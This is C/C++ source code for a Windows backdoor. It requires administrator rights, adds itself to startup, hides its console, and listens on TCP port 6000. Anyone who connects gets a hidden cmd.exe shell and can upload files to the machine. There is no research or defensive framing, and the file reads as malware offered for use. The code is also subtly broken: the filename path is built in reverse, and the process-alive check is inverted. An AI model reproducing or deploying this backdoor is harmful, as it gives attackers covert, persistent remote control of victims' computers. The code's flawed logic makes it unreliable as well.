#include "reg.h"
#pragma comment(lib, "ws2_32.lib")

//our variables, we need them globally to use them in all functions
char bufferin[1024]; //the buffer to read data from socket
char bufferout[65535]; //the buffer to write data to the socket
int i, port; // i is used for loop , port is going to keep the portnumber
SOCKET locsock, remsock;  //the sockets we are going to need
SOCKADDR_IN sinloc, sinrem; //the structures needed for our sockets
WSADATA wsadata; //wsadata
STARTUPINFO startinfo; //startupinfo structure for CreateProcess
SECURITY_ATTRIBUTES secat; //security attributes structure needed for CreateProcess
PROCESS_INFORMATION procinfo; //process info struct needed for CreateProcess
int bytesWritten;  //number of bytes written gets stored here
DWORD bytesRead, avail, exitcode; //number of bytes read, number of bytes available
//and the exitcode
void CommandPrompt(void);       //the function to give the command prompt
void handle_upload(SOCKET sock); //the function to handle file uploads
BOOL IsRunAsAdmin(); //function to check if the program is running as admin
void ShowErrorMessage(const wchar_t* message); //function to show an error message
int main() //the main function
{
   if (!IsRunAsAdmin())
    {
        ShowErrorMessage(L"Please run the program as administrator.");
        return 1;
    }
    // Add the program to startup
    AddToStartup();
    //hide console
    FreeConsole();
    //set listen port
    port = 6000;
    //tell windows we want to use sockets
    WSAStartup(0x101, &wsadata);
    //create socket
    locsock = socket(AF_INET, SOCK_STREAM, 0);

    //fill structure
    sinloc.sin_family = AF_INET;
    sinloc.sin_addr.s_addr = INADDR_ANY;
    sinloc.sin_port = htons(port);

    //bind the socket to the specified port
    if (bind(locsock, (SOCKADDR*)&sinloc, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
    {
        WSACleanup();
        printf("Error binding socket.\n");
        return EXIT_FAILURE;
    }

    //listen on the specified socket
    if (listen(locsock, 5) == SOCKET_ERROR)
    {
        WSACleanup();
        printf("Error listening socket.\n");
        return EXIT_FAILURE;
    }

    //infinite loop here to keep the program listening
    while (1)
    {
        remsock = SOCKET_ERROR;
        while (remsock == SOCKET_ERROR)
        {
            //accept connection to our program
            remsock = accept(locsock, NULL, NULL);
            if (remsock == INVALID_SOCKET)
            {
                //cleanup and exit program
                WSACleanup();
                printf("Error accepting socket.");
                return EXIT_FAILURE;
            }

            CommandPrompt(); //start the commandprompt function
        }
        closesocket(remsock); //close the socket
    }
    //we should never reach this point, but i've put this hear just in case 😉
    return EXIT_SUCCESS;
}

//*************************************************************
void CommandPrompt(void) //the function which handles the complete commandprompt
{
    secat.nLength = sizeof(SECURITY_ATTRIBUTES);
    secat.bInheritHandle = TRUE;
    DWORD bytesW;             //number of bytes written gets stored here
    HANDLE newstdin, newstdout, readout, writein; //the handles for our Pipes
    char exit1[] = { 'e','x','i','t',10,0 }; //we need this to compare our command to 'exit'
    char exit2[] = { 'E','X','I','T',10,0 }; //we need this to compare our command to 'EXIT'

    //create the pipes for our command prompt
    CreatePipe(&newstdin, &writein, &secat, 0);
    CreatePipe(&readout, &newstdout, &secat, 0);

    GetStartupInfo(&startinfo);

    //fill another structure
    startinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    startinfo.wShowWindow = SW_HIDE;
    startinfo.hStdOutput = newstdout;
    startinfo.hStdError = newstdout;
    startinfo.hStdInput = newstdin;

    wchar_t cmd[] = L"cmd.exe"; //the command we want to start

    //start cmd prompt
    if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &startinfo, &procinfo)) {
        printf("CreateProcess failed (%d).\n", GetLastError());
        return;
    }

    //endless loop
    while (1)
    {
        //check if cmd.exe is still running, if not then cleanup and start listening again.
        if (GetExitCodeProcess(procinfo.hProcess, &exitcode) == STILL_ACTIVE)
        {
            CloseHandle(procinfo.hThread);
            CloseHandle(procinfo.hProcess);
            CloseHandle(newstdin);
            CloseHandle(writein);
            CloseHandle(readout);
            CloseHandle(newstdout);
            break;
        }
        bytesRead = 0;
        //Sleep 0.5 seconds to give cmd.exe the chance to startup
        Sleep(500);
        //check if the pipe already contains something we can write to output
        PeekNamedPipe(readout, bufferout, sizeof(bufferout), &bytesRead, &avail, NULL);
        if (bytesRead != 0)
        {
            while (bytesRead != 0)
            {     //read data from cmd.exe and send to client, then clear the buffer
                int res = ReadFile(readout, bufferout, sizeof(bufferout), &bytesRead, NULL);
                send(remsock, bufferout, strlen(bufferout), 0);
                ZeroMemory(bufferout, sizeof(bufferout));
                Sleep(100);
                PeekNamedPipe(readout, bufferout, sizeof(bufferout), &bytesRead, &avail, NULL);
            }
        }
        // clear bufferin
        ZeroMemory(bufferin, sizeof(bufferin));
        //receive the command given
        recv(remsock, bufferin, sizeof(bufferin), 0);

        if (strncmp(bufferin, "upload", 6) == 0) {
            handle_upload(remsock);
            continue;
        }

        //if command is 'exit' or 'EXIT' then we have to capture it to prevent our program
        //from hanging.
        if ((strcmp(bufferin, exit1) == 0) || (strcmp(bufferin, exit2) == 0))
        {
            //let cmd.exe close by giving the command, then go to closeup label
            WriteFile(writein, bufferin, strlen(bufferin), &bytesW, NULL);
            goto closeup;
        }
        //else write the command to cmd.exe
        WriteFile(writein, bufferin, strlen(bufferin), &bytesW, NULL);
        // clear bufferin
        ZeroMemory(bufferin, sizeof(bufferin));
    }
    //close up all handles
closeup:
    if (procinfo.hThread != NULL) {
        CloseHandle(procinfo.hThread);
        procinfo.hThread = NULL;
    }
    if (procinfo.hProcess != NULL) {
        CloseHandle(procinfo.hProcess);
        procinfo.hProcess = NULL;
    }
    if (newstdin != NULL) {
        CloseHandle(newstdin);
        newstdin = NULL;
    }
    if (writein != NULL) {
        CloseHandle(writein);
        writein = NULL;
    }
    if (readout != NULL) {
        CloseHandle(readout);
        readout = NULL;
    }
    if (newstdout != NULL) {
        CloseHandle(newstdout);
        newstdout = NULL;
    }
}

void handle_upload(SOCKET sock) {
    char filename[256];
    int received;
    FILE* fp;

    // Clear the buffer and receive the filename
    ZeroMemory(bufferin, sizeof(bufferin));
    if (recv(sock, filename, sizeof(filename), 0) <= 0) {
        send(sock, "Error receiving filename\n", strlen("Error receiving filename\n"), 0);
        return;
    }

    // Remove newline character if present
    char* newline = strchr(filename, '\n');
    if (newline) {
        *newline = '\0';
    }
    // Open the file for writing

	//Add ./ to the filename to save the file in the current directory
	strcat(filename, "./");
    fp = fopen(filename, "w");
    if (fp == NULL) {
        send(sock, "Error opening file for writing\n", strlen("Error opening file for writing\n"), 0);
        return;
    }
    send(sock, "File created\n", strlen("File created\n"), 0);
    // Receive the file content
    char stop[] = "stop upload";
    while ((received = recv(sock, bufferin, sizeof(bufferin), 0)) > 0) {
        if (strstr(bufferin, "stop upload") != NULL) {
            break;
        }
        fwrite(bufferin, 1, received, fp);
    }
    fclose(fp);

    send(sock, "File received successfully\n", strlen("File received successfully\n"), 0);
}

BOOL IsRunAsAdmin()
{
    BOOL fIsRunAsAdmin = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PSID pAdministratorsGroup = NULL;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (!AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup))
    {
        dwError = GetLastError();
    }
    else
    {
        if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin))
        {
            dwError = GetLastError();
        }

        FreeSid(pAdministratorsGroup);
    }

    if (dwError != ERROR_SUCCESS)
    {
        std::cerr << "Error checking admin privileges: " << dwError << std::endl;
    }

    return fIsRunAsAdmin;
}

void ShowErrorMessage(const wchar_t* message)
{
    MessageBox(NULL, message, L"Error", MB_OK | MB_ICONERROR);
}
